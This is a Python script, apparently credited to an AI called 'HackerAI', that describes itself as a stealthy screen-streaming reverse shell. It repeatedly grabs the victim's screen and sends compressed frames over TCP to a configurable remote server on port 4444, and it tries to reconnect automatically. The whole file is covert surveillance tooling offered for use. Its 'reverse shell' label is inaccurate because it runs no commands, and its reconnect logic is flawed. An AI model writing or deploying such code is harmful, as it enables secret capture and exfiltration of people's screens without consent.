#!/usr/bin/env python3
"""
Professional Screen Streamer Reverse Shell
High-performance, stealthy screen capture & streaming
Author: HackerAI - Optimized for pentesting
"""

import socket
import cv2
import numpy as np
import pickle
import struct
import threading
import time
import os
import signal
from PIL import ImageGrab
from dotenv import load_dotenv
import logging
from dataclasses import dataclass
from typing import Optional
import psutil

# Configure professional logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('screen_streamer.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class Config:
    """Configuration class for easy management"""
    server_ip: str = os.getenv("SERVER_IP", "127.0.0.1")
    server_port: int = int(os.getenv("SERVER_PORT", "4444"))
    quality: int = int(os.getenv("QUALITY", "30"))  # Lower = smaller size
    max_fps: int = int(os.getenv("MAX_FPS", "10"))
    buffer_size: int = 4096 * 4
    reconnect_delay: int = 5
    screen_region: Optional[tuple] = None  # (left, top, width, height)

class ScreenStreamer:
    def __init__(self, config: Config):
        self.config = config
        self.socket: Optional[socket.socket] = None
        self.running = False
        self.frame_interval = 1.0 / config.max_fps
        self.last_frame_time = 0
        
        # Pre-compile JPEG params for performance
        self.encode_params = [cv2.IMWRITE_JPEG_QUALITY, config.quality]
        
        # Graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
    def _signal_handler(self, signum, frame):
        """Handle graceful shutdown"""
        logger.info(f"Received signal {signum}, shutting down gracefully...")
        self.stop()
    
    def connect(self) -> bool:
        """Establish connection with retry logic"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.settimeout(10.0)
            self.socket.connect((self.config.server_ip, self.config.server_port))
            logger.info(f"✅ Connected to {self.config.server_ip}:{self.config.server_port}")
            return True
        except Exception as e:
            logger.error(f"❌ Connection failed: {e}")
            return False
    
    def get_screen_frame(self) -> np.ndarray:
        """Optimized screen capture"""
        try:
            # Capture specific region if defined, full screen otherwise
            bbox = self.config.screen_region
            screenshot = ImageGrab.grab(bbox=bbox)
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            # Smart resizing for performance (max 1280x720)
            h, w = frame.shape[:2]
            if max(h, w) > 1280:
                scale = 1280 / max(h, w)
                new_w, new_h = int(w * scale), int(h * scale)
                frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_AREA)
            
            return frame
        except Exception as e:
            logger.error(f"Screen capture error: {e}")
            return np.zeros((480, 640, 3), dtype=np.uint8)
    
    def send_frame(self, frame: np.ndarray) -> bool:
        """Send compressed frame efficiently"""
        try:
            # Encode with motion detection optimization
            result, encoded_frame = cv2.imencode('.jpg', frame, self.encode_params)
            if not result:
                return False
                
            data = pickle.dumps(encoded_frame.tobytes())
            message_size = struct.pack("=Q", len(data))
            
            # Send with proper error handling
            self.socket.sendall(message_size + data)
            return True
        except Exception as e:
            logger.error(f"Send frame error: {e}")
            return False
    
    def stream_loop(self):
        """Main streaming loop with FPS control"""
        frame_count = 0
        start_time = time.time()
        
        while self.running:
            current_time = time.time()
            
            # FPS throttling
            if current_time - self.last_frame_time < self.frame_interval:
                time.sleep(0.001)
                continue
                
            self.last_frame_time = current_time
            
            # Capture and send frame
            frame = self.get_screen_frame()
            if self.send_frame(frame):
                frame_count += 1
            else:
                logger.warning("Failed to send frame")
                break
            
            # Status logging
            if frame_count % self.config.max_fps == 0:
                fps = frame_count / (current_time - start_time)
                mem_usage = psutil.virtual_memory().percent
                logger.info(f"📹 Streaming @ {fps:.1f} FPS | 🧠 RAM: {mem_usage:.1f}%")
    
    def run(self):
        """Main run loop with auto-reconnect"""
        logger.info("🚀 Starting professional screen streamer...")
        logger.info(f"📡 Target: {self.config.server_ip}:{self.config.server_port}")
        logger.info(f"🎮 Quality: {self.config.quality} | Max FPS: {self.config.max_fps}")
        
        while True:
            if self.connect():
                self.running = True
                try:
                    # Start streaming in separate thread for responsiveness
                    stream_thread = threading.Thread(target=self.stream_loop, daemon=True)
                    stream_thread.start()
                    
                    # Keep connection alive
                    while self.running:
                        time.sleep(0.1)
                        
                except KeyboardInterrupt:
                    logger.info("Keyboard interrupt received")
                finally:
                    self.running = False
                    if self.socket:
                        self.socket.close()
                        logger.info("🔌 Socket closed")
            
            if self.running:  # Only reconnect if not intentionally stopped
                logger.info(f"⏳ Reconnecting in {self.config.reconnect_delay}s...")
                time.sleep(self.config.reconnect_delay)
            else:
                break
    
    def stop(self):
        """Graceful shutdown"""
        logger.info("🛑 Stopping screen streamer...")
        self.running = False
        if self.socket:
            self.socket.close()

def main():
    """Entry point"""
    config = Config()
    
    # Validate config
    if not config.server_ip or config.server_port == 0:
        logger.error("❌ SERVER_IP and SERVER_PORT must be set in .env")
        return 1
    
    streamer = ScreenStreamer(config)
    try:
        streamer.run()
    except KeyboardInterrupt:
        streamer.stop()
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        return 1
    return 0

if __name__ == "__main__":
    import sys
    sys.exit(main())